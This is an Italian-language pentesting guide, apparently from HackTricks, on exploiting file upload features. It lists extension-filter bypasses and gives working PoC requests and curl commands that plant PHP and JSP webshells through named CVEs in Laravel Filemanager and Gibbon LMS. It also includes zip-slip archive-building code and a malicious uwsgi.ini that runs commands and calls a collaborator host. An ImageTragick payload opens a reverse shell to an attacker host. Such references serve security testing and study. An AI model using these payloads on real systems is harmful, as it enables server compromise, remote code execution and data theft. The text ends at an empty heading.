# Caricamento file

{{#include ../../banners/hacktricks-training.md}}

## Metodologia generale per il caricamento di file

Altre estensioni utili:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Bypass dei controlli sulle estensioni dei file

1. Se applicabile, verifica le estensioni precedenti. Testale anche usando alcune lettere maiuscole: _pHp, .pHP5, .PhAr ..._
2. Prova ad aggiungere una estensione valida prima dell’estensione di esecuzione (usa anche le estensioni precedenti):
- _file.png.php_
- _file.png.Php5_
3. Prova ad aggiungere caratteri speciali alla fine. Puoi usare Burp per bruteforceare tutti i caratteri ascii e Unicode. (Nota che puoi anche provare a usare le estensioni menzionate in precedenza)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Prova a bypassare le protezioni ingannando il parser delle estensioni lato server con tecniche come il raddoppio dell’estensione o l’aggiunta di dati junk (byte null) tra le estensioni. Puoi anche usare le estensioni precedenti per preparare un payload migliore.
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Aggiungi un altro livello di estensioni ai controlli precedenti:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Prova a mettere l’estensione di esecuzione prima dell’estensione valida e spera che il server sia mal configurato. (utile per sfruttare misconfigurazioni di Apache dove qualsiasi cosa con estensione **.php**, ma non necessariamente terminante con .php, eseguirà codice):
- _ex: file.php.png_
7. Utilizzo di NTFS alternate data stream (ADS) in Windows. In questo caso, un carattere due punti ":" verrà inserito dopo un’estensione proibita e prima di una permessa. Di conseguenza, verrà creato sul server un file vuoto con l’estensione proibita (es. "file.asax:.jpg”). Questo file potrebbe poi essere modificato usando altre tecniche come il suo short filename. Anche il pattern "**::$data**” può essere usato per creare file non vuoti. Pertanto, aggiungere un punto dopo questo pattern potrebbe essere utile per bypassare ulteriori restrizioni (es. "file.asp::$data.”)
8. Prova a superare i limiti del nome file. L’estensione valida viene troncata. E il PHP maligno rimane. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Alcuni upload handler rimuovono o normalizzano i caratteri punto finali dal nome file salvato. In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) nelle versioni precedenti alla 2.9.1, è possibile bypassare la validazione delle estensioni:

- Usando un MIME immagine valido e il magic header (es., il magic header di PNG `\x89PNG\r\n\x1a\n`).
- Nominando il file caricato con un’estensione PHP seguita da un punto, es., `shell.php.`.
- Il server rimuove il punto finale e persiste `shell.php`, che verrà eseguito se posizionato in una directory servita dal web (storage pubblico di default come `/storage/files/`).

PoC minimo (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Poi visita il percorso salvato (tipico in Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks impostando il **valore** dell'**header** **Content-Type** su: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** check aggiungendo all'inizio del file i **bytes di una vera immagine** (confondere il comando _file_). Oppure inserire la shell all'interno dei **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` oppure puoi anche **inserire il payload direttamente** in un'immagine:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Se alla tua immagine viene applicata la **compressione**, ad esempio usando alcune librerie PHP standard come [PHP-GD](https://www.php.net/manual/fr/book.image.php), le tecniche precedenti non saranno utili. Tuttavia, puoi usare il **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravvive alla compressione**.
- [**Github con il codice**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- La web page potrebbe anche **ridimensionare** l'**image**, usando ad esempio le funzioni PHP-GD `imagecopyresized` o `imagecopyresampled`. Tuttavia, puoi usare l'**IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravvive alla compressione**.
- [**Github con il codice**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Un'altra tecnica per creare un payload che **sopravvive a un ridimensionamento dell'immagine**, usando la funzione PHP-GD `thumbnailImage`. Tuttavia, puoi usare il **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravvive alla compressione**.
- [**Github con il codice**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Trova una vulnerabilità per **rinominare** il file già caricato (per cambiare l'estensione).
- Trova una vulnerabilità di **Local File Inclusion** per eseguire il backdoor.
- **Possibile divulgazione di informazioni**:
1. Carica **più volte** (e allo **stesso tempo**) lo **stesso file** con lo **stesso nome**
2. Carica un file con il **nome** di un **file** o **cartella** che **esiste già**
3. Caricare un file con **"." , "..", o "…" come nome**. Per esempio, in Apache su **Windows**, se l'applicazione salva i file caricati nella directory "/www/uploads/", il filename "." creerà un file chiamato uploads nella directory "/www/".
4. Carica un file che potrebbe non essere facilmente eliminabile come **"…:.jpg"** in **NTFS**. (Windows)
5. Carica un file in **Windows** con **caratteri non validi** come `|<>*?”` nel nome. (Windows)
6. Carica un file in **Windows** usando **nomi riservati** (**vietati**) come CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, e LPT9.
- Prova anche a **caricare un eseguibile** (.exe) o un **.html** (meno sospetto) che **eseguirà codice** se accidentalmente aperto dalla vittima.

### Special extension tricks

Se stai cercando di caricare file su un **PHP server**, [dai un'occhiata al trucco **.htaccess** per eseguire codice](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Se stai cercando di caricare file su un **ASP server**, [dai un'occhiata al trucco **.config** per eseguire codice](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

I file `.phar` sono come i `.jar` per java, ma per php, e possono essere **usati come un file php** (eseguendoli con php, o includendoli in uno script...)

L'estensione `.inc` è a volte usata per file php che servono solo per **importare file**, quindi, a un certo punto, qualcuno potrebbe aver permesso **l'esecuzione di questa estensione**.

## **Jetty RCE**

Se puoi caricare un file XML in un server Jetty puoi ottenere [RCE perché **nuovi *.xml e *.war sono processati automaticamente**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1). Quindi, come mostrato nell'immagine seguente, carica il file XML in `$JETTY_BASE/webapps/` e aspetta la shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Per un'esplorazione dettagliata di questa vulnerabilità consulta la ricerca originale: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Le vulnerabilità di Remote Command Execution (RCE) possono essere sfruttate su server uWSGI se si ha la possibilità di modificare il file di configurazione `.ini`. I file di configurazione uWSGI sfruttano una sintassi specifica per incorporare variabili "magiche", placeholder e operatori. In particolare, l'operatore '@', utilizzato come `@(filename)`, è progettato per includere il contenuto di un file. Tra i vari scheme supportati in uWSGI, lo scheme "exec" è particolarmente potente, permettendo la lettura di dati dall'output standard di un processo. Questa funzionalità può essere manipolata per scopi malevoli come Remote Command Execution o Arbitrary File Write/Read quando un file di configurazione `.ini` viene processato.

Considera il seguente esempio di un file `uwsgi.ini` dannoso, che mostra vari scheme:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
L'esecuzione del payload avviene durante il parsing del file di configurazione. Affinché la configurazione venga attivata e analizzata, il processo uWSGI deve essere riavviato (eventualmente dopo un crash o a causa di una Denial of Service attack) oppure il file deve essere impostato su auto-reload. La funzionalità auto-reload, se abilitata, ricarica il file a intervalli specificati al rilevamento di modifiche.

È cruciale comprendere la natura permissiva del parsing dei file di configurazione di uWSGI. In particolare, il payload discusso può essere inserito in un file binario (come un'immagine o un PDF), ampliando ulteriormente l'ambito di possibile sfruttamento.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Un endpoint non autenticato in Gibbon LMS consente la scrittura arbitraria di file all'interno della web root, portando a una pre-auth RCE passando un file PHP. Versioni vulnerabili: fino e incluso 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (il server ignora type/name, decodifica in base64 la parte finale)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

PoC minimo per scrivere e leggere un file:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Carica una webshell minimale ed esegui comandi:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Note:
- Il handler esegue `base64_decode($_POST["img"])` dopo aver diviso la stringa usando `;` e `,`, quindi scrive i byte in `$absolutePath . '/' . $_POST['path']` senza validare estensione/tipo.
- Il codice risultante viene eseguito come l'utente del servizio web (es., XAMPP Apache su Windows).

I riferimenti per questo bug includono l'advisory usd HeroLab e la voce NVD. Vedi la sezione References qui sotto.

## **wget File Upload/SSRF Trick**

In alcune occasioni potresti trovare che un server stia usando **`wget`** per **scaricare file** e puoi **indicare** l'**URL**. In questi casi, il codice potrebbe verificare che l'estensione dei file scaricati sia nella whitelist per assicurarsi che vengano scaricati solo file consentiti. Tuttavia, **questa verifica può essere bypassata.**\
La **lunghezza** massima di un **nome file** in **linux** è **255**, tuttavia, **wget** tronca i nomi dei file a **236** caratteri. Puoi **scaricare un file chiamato "A"*232+".php"+".gif"**, questo nome file **bypassa** il **controllo** (in questo esempio **".gif"** è un'estensione **valida**) ma `wget` **rinominerà** il file in **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Nota che **un'altra opzione** a cui potresti pensare per bypassare questo controllo è far sì che il **HTTP server reindirizzi a un file diverso**, così l'URL iniziale aggirerà il controllo e poi wget scaricherà il file reindirizzato con il nuovo nome. Questo **non funzionerà** **a meno che** wget non venga usato con il **parametro** `--trust-server-names` perché **wget scaricherà la pagina reindirizzata con il nome del file indicato nell'URL originale**.

### Evasione della directory di upload tramite NTFS junctions (Windows)

(Per questo attacco avrai bisogno di accesso locale alla macchina Windows) Quando gli upload sono archiviati in sottocartelle per utente su Windows (es., C:\Windows\Tasks\Uploads\<id>\) e controlli la creazione/cancellazione di quella sottocartella, puoi sostituirla con una directory junction che punta a una posizione sensibile (es., la webroot). I successivi upload verranno scritti nel percorso di destinazione, permettendo l'esecuzione di codice se il target interpreta codice lato server.

Esempio di flusso per reindirizzare gli upload nella webroot di XAMPP:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Note
- mklink /J creates an NTFS directory junction (reparse point). L'account del web server deve seguire la junction e avere permessi di scrittura nella destinazione.
- Questo reindirizza scritture arbitrarie di file; se la destinazione esegue script (PHP/ASP), questo diventa RCE.
- Difese: non permettere che le upload roots scrivibili siano controllabili dall'attaccante sotto C:\Windows\Tasks o simili; bloccare la creazione di junction; convalidare le estensioni lato server; memorizzare gli upload su un volume separato o con deny‑execute ACLs.

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

Alcuni handler di upload/ingest scrivono il raw request body in un percorso filesystem costruito da query parameter controllati dall'utente. Se l'handler supporta anche Content-Encoding: gzip e non canonicalizza/convalida il percorso di destinazione, puoi combinare path traversal con un payload gzippato per scrivere byte arbitrari in una directory servita dal web e ottenere RCE (es., piazzare una JSP sotto webapps di Tomcat).

Flusso di sfruttamento generico:
- Prepara il tuo payload lato server (es., minimal JSP webshell) e gzip-comprimi i byte.
- Invia una POST dove un path parameter (es., token) contiene traversal che esce dalla cartella prevista, e file indica il nome del file da persistere. Imposta Content-Type: application/octet-stream e Content-Encoding: gzip; il body è il payload compresso.
- Accedi al file scritto tramite browser per innescare l'esecuzione.

Illustrative request:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Poi attiva:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Note
- I percorsi target variano in base all'installazione (e.g., /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ in alcuni stack). Qualsiasi cartella esposta sul web che esegue JSP funzionerà.
- Burp Suite’s Hackvertor extension può produrre un corretto gzip body dal tuo payload.
- Questa è un pattern puro pre-auth arbitrary file write → RCE; non si basa su multipart parsing.

Mitigazioni
- Derive upload destinations server-side; non fidarti mai dei frammenti di percorso provenienti dai client.
- Canonicalizza e fai rispettare che il percorso risolto rimanga all'interno di una base directory allow-listed.
- Store uploads su un volume non eseguibile e nega l'esecuzione di script da percorsi scrivibili.

## Strumenti

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) è un potente strumento progettato per assistere Pentesters e Bug Hunters nel testing dei file upload mechanisms. Sfrutta varie tecniche di bug bounty per semplificare il processo di identificazione e sfruttamento delle vulnerabilità, garantendo valutazioni approfondite delle web applications.

### Corruzione degli indici di upload con le stranezze di snprintf (storico)

Alcuni handler di upload legacy che utilizzano `snprintf()` o funzioni simili per costruire array multi-file da un singolo upload possono essere ingannati nel forgiare la struttura `_FILES`. A causa di incoerenze e troncamenti nel comportamento di `snprintf()`, un singolo upload accuratamente costruito può apparire come più file indicizzati lato server, confondendo la logica che assume una forma rigida (es., trattandolo come un multi-file upload e prendendo rami non sicuri). Pur essendo un caso oggi di nicchia, questo pattern di “index corruption” ricompare occasionalmente in CTF e in codebase più vecchie.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Carica il \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) contenuto per verificare se il server ha qualche **antivirus**
- Verifica se esiste un **size limit** per l'upload dei file

Ecco una top 10 delle cose che puoi ottenere caricando (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

Se puoi uploadare uno ZIP che verrà decompresso all'interno del server, puoi fare 2 cose:

### Symlink

Uploada un archivio contenente soft link ad altri file; poi, accedendo ai file decompressi accederai ai file linkati:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Decomprimere in cartelle diverse

La creazione inaspettata di file in directory durante la decompressione è un problema significativo. Nonostante le ipotesi iniziali secondo cui questa configurazione potesse proteggere dall'esecuzione di comandi a livello OS tramite upload di file malevoli, il supporto alla compressione gerarchica e le capacità di directory traversal del formato di archivio ZIP possono essere sfruttate. Ciò permette agli attacker di bypassare le restrizioni e sfuggire dalle directory di upload sicure manipolando la funzionalità di decompressione dell'applicazione target.

An automated exploit to craft such files is available at [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). The utility can be used as shown:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Inoltre, il **symlink trick with evilarc** è un'opzione. Se l'obiettivo è prendere di mira un file come `/flag.txt`, dovresti creare un symlink a quel file nel tuo sistema. Questo garantisce che evilarc non incontri errori durante la sua esecuzione.

Di seguito è riportato un esempio di codice Python usato per creare un archivio zip malevolo:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

Per maggiori dettagli **consulta il post originale su**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Del codice PHP viene scritto per eseguire comandi passati tramite la variabile `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Vengono creati più file e viene assemblato un archivio zip che contiene questi file.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: I nomi dei file all'interno dello zip vengono modificati usando vi o un hex editor, cambiando "xxA" in "../" per attraversare le directory.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

### ZIP NUL-byte filename smuggling (PHP ZipArchive confusion)

Quando un backend valida le voci ZIP usando ZipArchive di PHP ma l'estrazione scrive nel filesystem usando i nomi raw, si può far passare un'estensione non consentita inserendo un NUL (0x00) nei campi filename. ZipArchive tratta il nome della voce come una C‑string e tronca al primo NUL; il filesystem scrive il nome completo, eliminando tutto dopo il NUL.

Flusso ad alto livello:
- Prepara un file contenitore legittimo (es. un PDF valido) che includa un piccolo stub PHP in uno stream in modo che magic/MIME rimanga PDF.
- Nominalo come `shell.php..pdf`, comprimilo in zip, poi modifica in esadecimale l'header locale ZIP e il filename della central directory per sostituire il primo `.` dopo `.php` con `0x00`, ottenendo `shell.php\x00.pdf`.
- I validator che si basano su ZipArchive "vedranno" `shell.php .pdf` e lo permetteranno; l'estrattore scrive `shell.php` su disco, portando a RCE se la cartella di upload è eseguibile.

Passaggi minimi del PoC:
```bash
# 1) Build a polyglot PDF containing a tiny webshell (still a valid PDF)
printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf

# 2) Trick name and zip
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf

# 3) Hex-edit both the local header and central directory filename fields
#    Replace the dot right after ".php" with 00 (NUL) => shell.php\x00.pdf
#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.

# 4) Local validation behavior
php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
# -> shows truncated at NUL (looks like ".pdf" suffix)
```
Note
- Cambia ENTRAMBE le occorrenze del filename (local e central directory). Alcuni strumenti aggiungono anche una voce data descriptor extra – regola tutti i campi name se presenti.
- Il file payload deve comunque passare il server‑side magic/MIME sniffing. Incapsulare il PHP in uno stream PDF mantiene l'header valido.
- Funziona quando il percorso di enum/validation e il percorso di extraction/write non concordano nella gestione delle stringhe.

### Stacked/concatenated ZIPs (disaccordo tra parser)

La concatenazione di due validi ZIP produce un blob in cui diversi parser si concentrano su differenti record EOCD. Molti strumenti individuano l'ultimo End Of Central Directory (EOCD), mentre alcune librerie (es. ZipArchive in workflow specifici) possono analizzare il primo archivio che trovano. Se la validation enumera il primo archivio e l'extraction utilizza un altro tool che rispetta l'ultimo EOCD, un archivio benigno può superare i controlli mentre uno malicious viene estratto.

PoC:
```bash
# Build two separate archives
printf test > t1; printf test2 > t2
zip zip1.zip t1; zip zip2.zip t2

# Stack them
cat zip1.zip zip2.zip > combo.zip

# Different views
unzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive
php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
```
Schema di abuso
- Crea un archivio benigno (tipo consentito, p.es. un PDF) e un secondo archivio che contiene un'estensione bloccata (p.es. `shell.php`).
- Concatenali: `cat benign.zip evil.zip > combined.zip`.
- Se il server valida con un parser (vede benign.zip) ma estrae con un altro (processa evil.zip), il file bloccato finisce nel percorso di estrazione.

## ImageTragic

Carica questo contenuto con un'estensione immagine per sfruttare la vulnerabilità **(ImageMagick , 7.0.1-1)** (come nel [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Incorporare PHP Shell in PNG

